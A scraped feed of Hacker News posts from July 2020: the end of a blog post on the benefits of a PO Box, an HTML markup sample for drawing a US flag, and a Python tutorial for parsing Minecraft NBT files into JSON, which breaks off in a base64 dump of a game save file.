<p>Still, I kept the PO Box. Then I started the newsletter. Every self published book marketing guru on the planet claims that starting a newsletter and growing it to a billion numbers will result in sales for your fantasy/romance/scifi novel. Unfortunately I don’t write for any of those genres and my newsletter grew stagnant after about fifty subscribers. The thing about commercial fiction is that you have to write commercial fiction to use succeed in their marketing tactics. </p>



<p>But hey, I still have the PO Box! But why? Well, I started sending postcards to friends and family. Not to sell them anything but to send thanks for something that would otherwise seem less personal in a text message. I put the PO box as the return address for these cards should someone else see the basically public note. </p>



<p>This is all great for me but what good is a PO Box for other folks? Literally any time you need to ship something to a person you don’t really know you should be using one. If you make 3D prints or printer components you want to use a PO Box to send parts from. If you develop PCB’s for your hobby and need to ship them to folks you’ll want to use one too. Really anything you make that you want to send to people you don’t <em>really</em> know. Stickers, zines, t-shirts, your bands latest album. With the whole selling things in a physical location being in the trash right now you can’t stand on the corner and sling products, you need a PO Box. </p>



<p>I guess this is the section where I put the pros and cons so here we go:</p>



<h4>Pros</h4>



<ul><li>Public Location Security</li><li>Cheaper than Netflix</li><li>Extra set of keys to feel important</li><li>Support your local post office</li></ul>



<h4>Cons</h4>



<ul><li>You have to drive to the post office to check the mail</li><li>They do cost money</li><li>You have to keep up with another set of keys</li><li>PO Box can’t be used as an address to register a business</li></ul>



<figure><img src="https://jetgirl.art/wp-content/uploads/2020/07/920x920.jpg" alt="" srcset="https://jetgirl.art/wp-content/uploads/2020/07/920x920.jpg 920w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-300x225.jpg 300w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-768x576.jpg 768w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-580x435.jpg 580w" sizes="(max-width: 920px) 100vw, 920px"><figcaption>Bianca Waters – mySanAntonio</figcaption></figure>



<p>For some people who live out in the boonies, travel for extended periods of the year, or change apartments every 6 months a PO Box is a must have. Folks who have individual mailboxes are prone to easily stolen mail. Those of us with the big mailbox hub in a subdivision already know what it’s like to have mail come in a little locked box. Even those can be compromised as they’re out in the open and typically unlit at night. </p>



<p>I could come up with more reasons but the two packs of bacon are done and the battery on the laptop is about to die. Hope you enjoyed this wall of text. Enjoy your 4th of July weekend!</p>
<!-- .post-date --><hr>
		

		
		

		

</article><!-- .post -->

	</section><!-- #site-content-posts -->

	<!-- #site-content-pagination -->

</div></div>]]>
            </description>
            <link>https://jetgirl.art/2020/07/04/you-need-a-po-box/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733223</guid>
            <pubDate>Sat, 04 Jul 2020 16:14:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Happy 4th of July Create United States Flag with HTML and CSS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23733027">thread link</a>) | @mr-developer
<br/>
July 4, 2020 | https://techjasmine.com/create-united-states-flag-with-html-and-css/ | <a href="https://web.archive.org/web/*/https://techjasmine.com/create-united-states-flag-with-html-and-css/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"flag"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"stripe"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"canton"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"star-row"</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>span </span><span>class</span><span>=</span><span>"star"</span><span>&gt;</span><span>&amp;</span><span>starf</span><span>;</span><span>&lt;</span><span>/</span><span>span</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&nbsp;&nbsp;</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p><p><span>&lt;</span><span>div </span><span>class</span><span>=</span><span>"message"</span><span>&gt;</span><span>I</span><span> </span>❤️<span> </span><span>USA</span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span></p></div></div></div>]]>
            </description>
            <link>https://techjasmine.com/create-united-states-flag-with-html-and-css/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733027</guid>
            <pubDate>Sat, 04 Jul 2020 15:44:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a command line tool to view Minecraft data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732999">thread link</a>) | @kaunta
<br/>
July 4, 2020 | https://johnlekberg.com/blog/2020-07-04-cli-minecraft.html | <a href="https://web.archive.org/web/*/https://johnlekberg.com/blog/2020-07-04-cli-minecraft.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://johnlekberg.com/blog.html">Return to Blog
</a></p><p>By John Lekberg on July 04, 2020.
</p><hr>
<p>This week's post is about building a command line tool the view
<a href="https://en.wikipedia.org/wiki/Minecraft">Minecraft</a>
<a href="https://minecraft.gamepedia.com/NBT_format">NBT</a> files.
You will learn:</p>
<ul>
<li>How to unpack <a href="https://en.wikipedia.org/wiki/Binary_file">binary data</a>
with the <a href="https://docs.python.org/3/library/struct.html">struct</a> module.</li>
<li>How to write a <a href="https://en.wikipedia.org/wiki/Recursive_descent_parser">recursive
parser</a> for the
<a href="https://minecraft.gamepedia.com/NBT_format">NBT</a> file format.</li>
<li>How to turn the parsed data into a
<a href="https://en.wikipedia.org/wiki/JSON">JSON</a> friendly file format.</li>
</ul>
<p><a href="https://minecraft.gamepedia.com/NBT_format">Named Binary Tag</a> (NBT) files
store information about Minecraft in a simple <a href="https://en.wikipedia.org/wiki/Binary_file">binary file
format</a>.
To learn more about the details of the NBT format, read these documents:</p>
<ul>
<li><a href="https://minecraft.gamepedia.com/NBT_format">"NBT format" via Minecraft
Wiki</a></li>
<li><a href="https://wiki.vg/NBT">"NBT" via Wiki.vg</a></li>
<li><a href="https://web.archive.org/web/20110723210920/http://www.minecraft.net/docs/NBT.txt">"Named Binary Tag specification" via Minecraft.net
(WebArchive)</a></li>
</ul>

<blockquote>
<p><strong>view-nbt</strong></p>
</blockquote>
<pre><code>#!/usr/bin/env python3

import collections
import enum
import gzip
import json
import struct

# ---- Data

Tag = enum.Enum(
    "Tag",
    [
        "End",
        "Byte",
        "Short",
        "Int",
        "Long",
        "Float",
        "Double",
        "Byte_Array",
        "String",
        "List",
        "Compound",
        "Int_Array",
        "Long_Array",
    ],
)

tag_scalar = {
    Tag.Byte,
    Tag.Short,
    Tag.Int,
    Tag.Long,
    Tag.Float,
    Tag.Double,
    Tag.String,
}

tag_array = {Tag.Byte_Array, Tag.Int_Array, Tag.Long_Array}

byte_tag = {
    0x00: Tag.End,
    0x01: Tag.Byte,
    0x02: Tag.Short,
    0x03: Tag.Int,
    0x04: Tag.Long,
    0x05: Tag.Float,
    0x06: Tag.Double,
    0x07: Tag.Byte_Array,
    0x08: Tag.String,
    0x09: Tag.List,
    0x0A: Tag.Compound,
    0x0B: Tag.Int_Array,
    0x0C: Tag.Long_Array,
}

scalar_fmt = {
    Tag.Byte: "b",
    Tag.Short: "h",
    Tag.Int: "i",
    Tag.Long: "q",
    Tag.Float: "f",
    Tag.Double: "d",
}

array_fmt = {
    Tag.Byte_Array: "b",
    Tag.Int_Array: "i",
    Tag.Long_Array: "q",
}


def _validate_data():
    """Runs some assertions to make sure I defined the data
    correctly.
    """
    assert set(Tag) == tag_scalar | tag_array | {
        Tag.End,
        Tag.Compound,
        Tag.List,
    }
    assert set(Tag) == set(byte_tag.values())
    assert scalar_fmt.keys() == tag_scalar - {Tag.String}
    assert array_fmt.keys() == tag_array


# ---- Parsing

Node = collections.namedtuple(
    "Node", ["tag", "name", "value"]
)


def parse(data):
    """Parse binary NBT data into a Node.

    data -- a bytes-like object containing the NBT data.
    """
    M = bytes(data)
    I = 0

    def take(fmt):
        """Unpack data at the current offset and advance the
        offset forward.
        """
        nonlocal I
        s = struct.Struct("&gt;" + fmt)
        [value] = s.unpack_from(M, offset=I)
        I += s.size
        return value

    def take_s(N):
        """Take an N character string from the offset and
        advance the offset forward.
        """
        return take(f"{N}s").decode("utf-8")

    def repeat(N, f):
        """Create a list from calling a function N times."""
        return [f() for _ in range(N)]

    def _parse(*, tag, named):
        """Recursively parse the data.

        tag -- Optional[Tag]. If the Tag is known in
            advance, then this is that Tag, otherwise None.
            This is used by Tag.List, which provides the
            element tag types.
        named -- Boolean. "A Tag name should be parsed."
            E.g. this is True inside Tag.Compound, but False
            inside Tag.List.
        """
        if tag is None:
            tag = byte_tag[take("B")]

        name = None
        if named and tag != Tag.End:
            N = take("H")
            name = take_s(N)

        value = None
        if tag in scalar_fmt:
            value = take(scalar_fmt[tag])
        elif tag == Tag.String:
            N = take("H")
            value = take_s(N)
        elif tag in array_fmt:
            N = take("i")
            value = repeat(N, lambda: take(array_fmt[tag]))
        elif tag == Tag.List:
            list_tag = byte_tag[take("B")]
            N = take("i")
            value = repeat(
                N, lambda: _parse(tag=list_tag, named=False)
            )
        elif tag == Tag.Compound:
            value = []
            while True:
                node = _parse(tag=None, named=True)
                if node.tag == Tag.End:
                    break
                value.append(node)

        return Node(tag=tag, name=name, value=value)

    return _parse(tag=None, named=True)


# ---- JSON Formatting

tag_use_value = tag_scalar | tag_array


def json_friendly(node):
    """Turn a Node object into data that is more JSON
    friendly.

    E.g. Tag.Compound is turned into a dictionary. Tag.List
    is turned into a list.
    """
    if node.tag in tag_use_value:
        return node.value
    elif node.tag == Tag.List:
        return [
            json_friendly(subnode) for subnode in node.value
        ]
    elif node.tag == Tag.Compound:
        return {
            subnode.name: json_friendly(subnode)
            for subnode in node.value
        }


# ---- Main Logic

if __name__ == "__main__":
    _validate_data()

    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("nbt_file")
    parser.add_argument(
        "--gzip",
        action="store_true",
        help="use if nbt_file is GZIP compressed",
    )
    args = parser.parse_args()

    with open(args.nbt_file, "rb") as file:
        data = file.read()
    if args.gzip:
        data = gzip.decompress(data)
    node = parse(data)
    print(json.dumps(json_friendly(node)))
</code></pre>
<blockquote>
<pre><code>$ ./view-nbt --help
</code></pre>
</blockquote>
<pre><code>usage: view-nbt [-h] [--gzip] nbt_file

positional arguments:
  nbt_file

optional arguments:
  -h, --help  show this help message and exit
  --gzip      use if nbt_file is GZIP compressed
</code></pre>

<p>I have an NBT file, <code>level.dat</code>, that contains information about a Minecraft
level that I play on:</p>
<blockquote>
<pre><code>$ cat level.dat | openssl base64
</code></pre>
</blockquote>
<pre><code>H4sIAAAAAAAAAMVZzY8cRxV/s7M7O9P77V07tkMgBC4oxMT5sCJEEu/OeNdr1vFq
x4lNLqOa7pqZYqu7mqrqXQ8HFCFxiMQNATHKIScO4eOKkEBykPiULSHxByAkBBeQ
QOKUS3hV1T3T4+611ygSI/VopurVq/devfd79V57AB5Mt4gmVTh7g0QBlSzqX5cE
f7Rjchg1ByTyKQCcqcHChpA43qSRpvJNSD8V8Fqs12N+wvWwOg0nHFWbfZ3uUBlf
